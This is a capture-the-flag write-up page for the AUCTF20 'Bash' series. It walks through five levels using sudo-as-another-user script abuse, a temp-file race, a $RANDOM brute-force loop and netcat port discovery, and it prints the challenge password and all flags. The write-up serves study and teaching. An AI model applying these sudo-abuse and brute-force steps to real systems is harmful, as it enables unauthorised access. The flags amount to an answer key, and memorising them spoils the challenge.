@@ -1,0 +1,149 @@
+<!doctype html><html lang=en class="sidebar-visible no-js ayu"><meta charset=utf-8><title>AUCTF20 Bash - Capture The Flag</title><meta charset=utf-8><meta name=description content><meta name=viewport content="width=device-width,initial-scale=1"><meta name=theme-color content="#ffffff"><link rel="shortcut icon" href=../../favicon.png><link rel=stylesheet href=../../css/variables.css><link rel=stylesheet href=../../css/general.css><link rel=stylesheet href=../../css/chrome.css><link rel=stylesheet href=../../css/print.css media=print><link rel=stylesheet href=../../FontAwesome/css/font-awesome.css><link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500" rel=stylesheet><link rel=stylesheet href=../../highlight.css><link rel=stylesheet href=../../tomorrow-night.css><link rel=stylesheet href=../../ayu-highlight.css><link rel=stylesheet href=../../theme/mermaid.css><script>var path_to_root="../../";var default_theme=window.matchMedia("(prefers-color-scheme: dark)").matches?"ayu":"ayu";</script><script>try{var theme=localStorage.getItem('mdbook-theme');var sidebar=localStorage.getItem('mdbook-sidebar');if(theme.startsWith('"')&&theme.endsWith('"')){localStorage.setItem('mdbook-theme',theme.slice(1,theme.length-1));}
+if(sidebar.startsWith('"')&&sidebar.endsWith('"')){localStorage.setItem('mdbook-sidebar',sidebar.slice(1,sidebar.length-1));}}catch(e){}</script><script>var theme;try{theme=localStorage.getItem('mdbook-theme');}catch(e){}
+if(theme===null||theme===undefined){theme=default_theme;}
+var html=document.querySelector('html');html.classList.remove('no-js')
+html.classList.remove('ayu')
+html.classList.add(theme);html.classList.add('js');</script><script>var html=document.querySelector('html');var sidebar='hidden';if(document.body.clientWidth>=1080){try{sidebar=localStorage.getItem('mdbook-sidebar');}catch(e){}
+sidebar=sidebar||'visible';}
+html.classList.remove('sidebar-visible');html.classList.add("sidebar-"+sidebar);</script><nav id=sidebar class=sidebar aria-label="Table of contents"><div class=sidebar-scrollbox><ol class=chapter><li class="chapter-item expanded"><a href=../../index.html><strong aria-hidden=true>1.</strong> Introduction</a><li class="chapter-item expanded"><a href=../../MISCELLANEOUS.html><strong aria-hidden=true>2.</strong> Miscellaneous</a><li class="chapter-item expanded"><a href=../../ctf/index.html><strong aria-hidden=true>3.</strong> Capture The Flag</a><li><ol class=section><li class="chapter-item expanded"><a href=../../ctf/binary/index.html><strong aria-hidden=true>3.1.</strong> Binary Exploitation</a><li><ol class=section><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-handy_shellcode.html><strong aria-hidden=true>3.1.1.</strong> PicoCTF19 Handy Shellcode</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-overflow_0.html><strong aria-hidden=true>3.1.2.</strong> PicoCTF19 OverFlow 0</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-overflow_1.html><strong aria-hidden=true>3.1.3.</strong> PicoCTF19 OverFlow 1</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-overflow_2.html><strong aria-hidden=true>3.1.4.</strong> PicoCTF19 OverFlow 2</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-new_overflow_1.html><strong aria-hidden=true>3.1.5.</strong> PicoCTF19 NewOverFlow 1</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-new_overflow_2.html><strong aria-hidden=true>3.1.6.</strong> PicoCTF19 NewOverFlow 2</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-slippery_shellcode.html><strong aria-hidden=true>3.1.7.</strong> PicoCTF19 Slippery-Shellcode</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-stringzz.html><strong aria-hidden=true>3.1.8.</strong> PicoCTF19 Stringzz</a></ol><li class="chapter-item expanded"><a href=../../ctf/crypto/index.html><strong aria-hidden=true>3.2.</strong> Crypto</a><li><ol class=section><li class="chapter-item expanded"><a href=../../ctf/crypto/hackcon18-caesar.html><strong aria-hidden=true>3.2.1.</strong> Hackcon2018 Caesar Salad</a><li class="chapter-item expanded"><a href=../../ctf/crypto/hackcon18-salad.html><strong aria-hidden=true>3.2.2.</strong> Hackcon2018 Salad Up.</a><li class="chapter-item expanded"><a href=../../ctf/crypto/icectf18q-garfield.html><strong aria-hidden=true>3.2.3.</strong> IceCTF18Q Garfield</a><li class="chapter-item expanded"><a href=../../ctf/crypto/tjctf18-classic.html><strong aria-hidden=true>3.2.4.</strong> TJCTF18 Classic</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-numbers.html><strong aria-hidden=true>3.2.5.</strong> PicoCTF19 The Numbers</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-caesar.html><strong aria-hidden=true>3.2.6.</strong> PicoCTF19 Caesar</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-wavesoverlambda.html><strong aria-hidden=true>3.2.7.</strong> PicoCTF19 Waves Lambda</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-lacifrede.html><strong aria-hidden=true>3.2.8.</strong> PicoCTF19 La Cifra De</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-rsapopquiz.html><strong aria-hidden=true>3.2.9.</strong> PicoCTF19 RSA Pop Quiz</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-minirsa.html><strong aria-hidden=true>3.2.10.</strong> PicoCTF19 miniRSA</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-b00tl3gRSA2.html><strong aria-hidden=true>3.2.11.</strong> PicoCTF19 b00tl3gRSA2</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-b00tl3gRSA3.html><strong aria-hidden=true>3.2.12.</strong> PicoCTF19 b00tl3gRSA3</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-john_pollard.html><strong aria-hidden=true>3.2.13.</strong> PicoCTF19 john_pollard</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-aesabc.html><strong aria-hidden=true>3.2.14.</strong> PicoCTF19 AES-ABC</a><li class="chapter-item expanded"><a href=../../ctf/crypto/auctf20-extraordinary.html><strong aria-hidden=true>3.2.15.</strong> AUCTF20 Extraordinary</a></ol><li class="chapter-item expanded"><a href=../../ctf/forensics/index.html><strong aria-hidden=true>3.3.</strong> Forensics</a><li><ol class=section><li class="chapter-item expanded"><a href=../../ctf/forensics/aeroctf20-drawings.html><strong aria-hidden=true>3.3.1.</strong> AeroCTF20 Drawings</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-garden.html><strong aria-hidden=true>3.3.2.</strong> PicoCTF19 Garden</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-unzip.html><strong aria-hidden=true>3.3.3.</strong> PicoCTF19 Unzip</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-so-meta.html><strong aria-hidden=true>3.3.4.</strong> PicoCTF19 So Meta</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-what-lies-within.html><strong aria-hidden=true>3.3.5.</strong> PicoCTF19 Lies Within</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-extensions.html><strong aria-hidden=true>3.3.6.</strong> PicoCTF19 Extensions</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-shark-on-wire-1.html><strong aria-hidden=true>3.3.7.</strong> PicoCTF19 Shark Wire</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-whitepages.html><strong aria-hidden=true>3.3.8.</strong> PicoCTF19 WhitePages</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-like1000.html><strong aria-hidden=true>3.3.9.</strong> PicoCTF19 like1000</a></ol><li class="chapter-item expanded"><a href=../../ctf/misc/index.html><strong aria-hidden=true>3.4.</strong> Misc</a><li><ol class=section><li class="chapter-item expanded"><a href=../../ctf/misc/auctf20-bash.html class=active><strong aria-hidden=true>3.4.1.</strong> AUCTF20 Bash</a></ol><li class="chapter-item expanded"><a href=../../ctf/reversing/index.html><strong aria-hidden=true>3.5.</strong> Reversing</a><li><ol class=section><li class="chapter-item expanded"><a href=../../ctf/reversing/auctf20-mrgame.html><strong aria-hidden=true>3.5.1.</strong> AUCTF20 Mr. Game</a></ol><li class="chapter-item expanded"><a href=../../ctf/web/index.html><strong aria-hidden=true>3.6.</strong> Web</a><li><ol class=section><li class="chapter-item expanded"><a href=../../ctf/web/seccon19-web_search.html><strong aria-hidden=true>3.6.1.</strong> SECCON19 Web Search</a><li class="chapter-item expanded"><a href=../../ctf/web/tmctf19-finals-containers.html><strong aria-hidden=true>3.6.2.</strong> TMCTF19F Container</a><li class="chapter-item expanded"><a href=../../ctf/web/insctf20-quals-lowdeep.html><strong aria-hidden=true>3.6.3.</strong> INSCTF20Q LowDeep</a></ol></ol></ol></div><div id=sidebar-resize-handle class=sidebar-resize-handle></div></nav><div id=page-wrapper class=page-wrapper><div class=page><div id=menu-bar-hover-placeholder></div><div id=menu-bar class="menu-bar sticky bordered"><div class=left-buttons><button id=sidebar-toggle class=icon-button type=button title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls=sidebar>
+<i class="fa fa-bars"></i></button>
+<button id=theme-toggle class=icon-button type=button title="Change theme" aria-label="Change theme" aria-haspopup=true aria-expanded=false aria-controls=theme-list>
+<i class="fa fa-paint-brush"></i></button><ul id=theme-list class=theme-popup aria-label=Themes role=menu><li role=none><button role=menuitem class=theme id=light>Light</button><li role=none><button role=menuitem class=theme id=rust>Rust</button><li role=none><button role=menuitem class=theme id=coal>Coal</button><li role=none><button role=menuitem class=theme id=navy>Navy</button><li role=none><button role=menuitem class=theme id=ayu>Ayu (default)</button></ul><button id=search-toggle class=icon-button type=button title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded=false aria-keyshortcuts=S aria-controls=searchbar>
+<i class="fa fa-search"></i></button></div><h1 class=menu-title>Capture The Flag</h1><div class=right-buttons><a href=../../print.html title="Print this book" aria-label="Print this book"><i id=print-button class="fa fa-print"></i></a><a href=https://github.com/sgama/ctf.samsongama.com title="Git repository" aria-label="Git repository"><i id=git-repository-button class="fa fa-github"></i></a></div></div><div id=search-wrapper class=hidden><form id=searchbar-outer class=searchbar-outer><input type=search name=search id=searchbar name=searchbar placeholder="Search this book ..." aria-controls=searchresults-outer aria-describedby=searchresults-header></form><div id=searchresults-outer class="searchresults-outer hidden"><div id=searchresults-header class=searchresults-header></div><ul id=searchresults></ul></div></div><script>document.getElementById('sidebar-toggle').setAttribute('aria-expanded',sidebar==='visible');document.getElementById('sidebar').setAttribute('aria-hidden',sidebar!=='visible');Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link){link.setAttribute('tabIndex',sidebar==='visible'?0:-1);});</script><div id=content class=content><main><h1><a class=header href=#auctf20-bash id=auctf20-bash>AUCTF20 Bash</a></h1><p>This write-up contains 5 challenges that builds on top of each other.<h2><a class=header href=#bash-1 id=bash-1>Bash 1</a></h2><h3><a class=header href=#problem id=problem>Problem</a></h3><p>SSH into the server<p><code>ssh challenges.auctf.com -p 30040 -l level1</code><p>password: <code>aubie</code><h3><a class=header href=#solution id=solution>Solution</a></h3><pre><code class=language-bash>$ ssh challenges.auctf.com -p 30040 -l level1
+level1@challenges.auctf.com's password:
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
+&lt; REDACTED &gt;
+$ ls -al
+total 24
+dr-xr-xr-x 1 root   root   4096 Apr  5 03:19 .
+drwxr-xr-x 1 root   root   4096 Apr  4 22:16 ..
+-rw-r--r-- 1 level1 level1  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 level1 level1 3771 Apr  4  2018 .bashrc
+-rw-r--r-- 1 level1 level1  807 Apr  4  2018 .profile
+-rw-rw-r-- 1 root   root     24 Apr  1 21:25 README
+$ cat README
+auctf{W3lcoM3_2_da_C7F}
+</code></pre><h3><a class=header href=#flag id=flag>Flag</a></h3><p><code>auctf{W3lcoM3_2_da_C7F}</code><h2><a class=header href=#bash-2 id=bash-2>Bash 2</a></h2><h3><a class=header href=#problem-1 id=problem-1>Problem</a></h3><p>SSH into the server<p><code>ssh challenges.auctf.com -p 30040 -l level2</code><p>password is the flag of the previous Bash challenge<h3><a class=header href=#solution-1 id=solution-1>Solution</a></h3><pre><code class=language-bash>$ ls -al
+total 28
+dr-xr-xr-x 1 root   root   4096 Apr  5 03:19 .
+drwxr-xr-x 1 root   root   4096 Apr  4 22:16 ..
+-rw-r--r-- 1 level2 level2  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 level2 level2 3771 Apr  4  2018 .bashrc
+-rw-r--r-- 1 level2 level2  807 Apr  4  2018 .profile
+-r--r----- 1 level3 level3   22 Apr  1 21:25 flag.txt
+-r-xr-x--- 1 level3 level2  110 Apr  1 21:25 random_dirs.sh
+$ cat flag.txt
+cat: flag.txt: Permission denied
+$ cat random_dirs.sh
+#!/bin/bash
+
+x=$RANDOM
+
+base64 flag.txt &gt; /tmp/$x
+function finish {
+        rm  /tmp/$x
+}
+trap finish EXIT
+
+sleep 15
+</code></pre><p>The <code>flag</code> is owned by user <code>level3</code> and is in group <code>level2</code>, which is the group of my user. The flag is only readable by user <code>level3</code>.<p>The bash script under the correct user will be able to read the flag and place it into a worldwide readable file in <code>/tmp</code>.<p>Let's take a snapshot of the <code>/tmp</code> directory:<pre><code class=language-bash>$ ls /tmp/
+111  12  12183  3865  alf.sh  flag.txt  hello  hi  passcodes.sh  prova.sh
+</code></pre><p>Let's run the script and throw it into the background:<pre><code class=language-bash>$ sudo -u level3 ./random_dirs.sh
+^Z[2] + Stopped                    sudo -u level3 ./random_dirs.sh
+</code></pre><p>Let's view <code>/tmp</code> to see if any files were added:<pre><code class=language-bash>$ ls /tmp/
+111  12  12183  3865  8037  alf.sh  flag.txt  hello  hi  passcodes.sh  prova.sh
+$ cat /tmp/8037
+YXVjdGZ7ZzB0dEBfbXV2X2Zhczd9Cg==
+</code></pre><p>It's a base64 string:<pre><code class=language-bash>$ cat /tmp/8037 | base64 -d
+auctf{g0tt@_muv_fas7}
+</code></pre><h3><a class=header href=#flag-1 id=flag-1>Flag</a></h3><p><code>auctf{g0tt@_muv_fas7}</code><h2><a class=header href=#bash-3 id=bash-3>Bash 3</a></h2><h3><a class=header href=#problem-2 id=problem-2>Problem</a></h3><p>SSH into the server<p><code>ssh challenges.auctf.com -p 30040 -l level3</code><p>password is the flag to the previous Bash challenge<h3><a class=header href=#solution-2 id=solution-2>Solution</a></h3><pre><code class=language-bash>$ ls -al
+total 28
+dr-xr-xr-x 1 root   root   4096 Apr  5 03:19 .
+drwxr-xr-x 1 root   root   4096 Apr  4 22:16 ..
+-rw-r--r-- 1 level3 level3  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 level3 level3 3771 Apr  4  2018 .bashrc
+-rw-r--r-- 1 level3 level3  807 Apr  4  2018 .profile
+-r--r----- 1 level4 level4   30 Apr  1 21:25 flag.txt
+-r-xr-x--- 1 level4 level3  179 Apr  1 21:25 passcodes.sh
+$ cat passcodes.sh
+#!/bin/bash
+
+x=$RANDOM
+echo &quot;Input the random number.&quot;
+read input
+
+if [[ &quot;$input&quot; -eq &quot;$x&quot; ]]
+then
+        echo &quot;AWESOME sauce&quot;
+        cat flag.txt
+else
+        echo &quot;$input&quot;
+        echo &quot;$x try again&quot;
+fi
+</code></pre><p>Similar file structure to last time. The script tries to ask you to guess a random number.<p>Bruteforce:<pre><code class=language-bash>$ bash -c 'for i in {0..30000}; do echo i | sudo -u level4 ./passcodes.sh; done | grep -e &quot;AWESOME&quot; -e &quot;auctf&quot;'
+# 5 minute later after brute forcing with fingers crossed there is an overlap
+auctf{wut_r_d33z_RaNdom_numz}
+</code></pre><h3><a class=header href=#flag-2 id=flag-2>Flag</a></h3><p><code>auctf{wut_r_d33z_RaNdom_numz}</code><h2><a class=header href=#bash-4 id=bash-4>Bash 4</a></h2><h3><a class=header href=#problem-3 id=problem-3>Problem</a></h3><p>SSH into the server<p><code>ssh challenges.auctf.com -p 30040 -l level4</code><h3><a class=header href=#solution-3 id=solution-3>Solution</a></h3><pre><code class=language-bash>$ ls -al
+total 28
+dr-xr-xr-x 1 root   root   4096 Apr  5 03:19 .
+drwxr-xr-x 1 root   root   4096 Apr  4 22:16 ..
+-rw-r--r-- 1 level4 level4  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 level4 level4 3771 Apr  4  2018 .bashrc
+-rw-r--r-- 1 level4 level4  807 Apr  4  2018 .profile
+-r--r----- 1 level5 level5   25 Apr  1 21:25 flag.txt
+-r-xr-x--- 1 level5 level4  209 Apr  1 21:25 print_file.sh
+$ cat print_file.sh
+#!/bin/bash
+
+if [ ! -z &quot;$@&quot; ]
+then
+        cat $@ # 2&gt;/dev/null
+        # if [ ! $? -eq 0 ]
+        # then
+        #       echo &quot;Printing error. Check file permissions&quot;
+        # fi
+else
+        echo &quot;Please enter a file.&quot;
+        echo &quot;./print_file FILENAME&quot;
+fi
+$ sudo -u level5 ./print_file.sh flag.txt
+auctf{FunKy_P3rm1ssi0nZ}
+</code></pre><p>Nothing new here.<h3><a class=header href=#flag-3 id=flag-3>Flag</a></h3><p><code>auctf{FunKy_P3rm1ssi0nZ}</code><h2><a class=header href=#bash-5 id=bash-5>Bash 5</a></h2><h3><a class=header href=#problem-4 id=problem-4>Problem</a></h3><p><code>ssh challenges.auctf.com -p 30040 -l level5</code><p>password is the previous Bash challenge flag<h3><a class=header href=#solution-4 id=solution-4>Solution</a></h3><pre><code class=language-bash>$ ls -al
+total 28
+dr-xr-xr-x 1 root   root   4096 Apr  5 03:19 .
+drwxr-xr-x 1 root   root   4096 Apr  4 22:16 ..
+-rw-r--r-- 1 level5 level5  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 level5 level5 3771 Apr  4  2018 .bashrc
+-rw-r--r-- 1 level5 level5  807 Apr  4  2018 .profile
+-r--r----- 1 root   root     23 Apr  1 21:25 flag.txt
+-r-xr-x--- 1 root   level5  137 Apr  1 21:25 portforce.sh
+$ cat portforce.sh
+#!/bin/bash
+
+x=$(shuf -i 1024-65500 -n 1)
+echo &quot;Guess the listening port&quot;
+input=$(nc -lp $x)
+echo &quot;That was easy right? :)&quot;
+cat flag.txt
+</code></pre><p>It seems like the script opens <code>netcat</code> listener and waits for it to close before printing the flag. Let's verify:<pre><code class=language-bash>$ sudo -u root ./portforce.sh
+Guess the listening port
+</code></pre><p>It hangs there. We need to determine the port it's listening on.<p>The command <code>ps -ef</code> will show all running commands:<pre><code class=language-bash>$ echo $$
+13413
+$ ps -ef | grep -e $$
+level5   13413 13289  0 22:48 pts/23   00:00:00 -sh
+level5   27145 13413  0 22:51 pts/23   00:00:00 ps -ef
+level5   27146 13413  0 22:51 pts/23   00:00:00 grep -e 13413
+</code></pre><p>Great, so let's open a second window and run the listener, then run the same command above again but filter for nc instead of the UID.<pre><code class=language-bash>$ ps -ef | grep -e &quot;nc&quot;
+level5    8866 19459  0 22:46 pts/3    00:00:00 nc localhost 23862
+level5   12703 12692  0 22:51 pts/5    00:00:00 nc -lp 3830
+level5   17378 17373  0 22:51 pts/19   00:00:00 nc -lp 54316
+level5   19271 13413  0 22:52 pts/23   00:00:00 grep -e nc
+root     30322 30307  0 22:52 pts/22   00:00:00 nc -lp 13177
+level5   32391 32386  0 22:49 pts/25   00:00:00 nc -lp 64438
+$ nc localhost 13177
+^C
+</code></pre><p>It's port <code>13177</code> this time. Let's go back to the netcat listener window. Looks like it exited:<pre><code class=language-bash>$ sudo -u root ./portforce.sh
+Guess the listening port
+That was easy right? :)
+auctf{n3tc@_purt_$can}
+</code></pre><h3><a class=header href=#flag-4 id=flag-4>Flag</a></h3><p><code>auctf{n3tc@_purt_$can}</code></main><nav class=nav-wrapper aria-label="Page navigation"><a rel=prev href=../../ctf/misc/index.html class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts=Left><i class="fa fa-angle-left"></i></a><a rel=next href=../../ctf/reversing/index.html class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts=Right><i class="fa fa-angle-right"></i></a><div style=clear:both></div></nav></div></div><nav class=nav-wide-wrapper aria-label="Page navigation"><a rel=prev href=../../ctf/misc/index.html class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts=Left><i class="fa fa-angle-left"></i></a><a rel=next href=../../ctf/reversing/index.html class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts=Right><i class="fa fa-angle-right"></i></a></nav></div><script>window.playpen_copyable=true;</script><script src=../../elasticlunr.min.js></script><script src=../../mark.min.js></script><script src=../../searcher.js></script><script src=../../clipboard.min.js></script><script src=../../highlight.js></script><script src=../../book.js></script><script src=../../theme/mermaid.js></script>
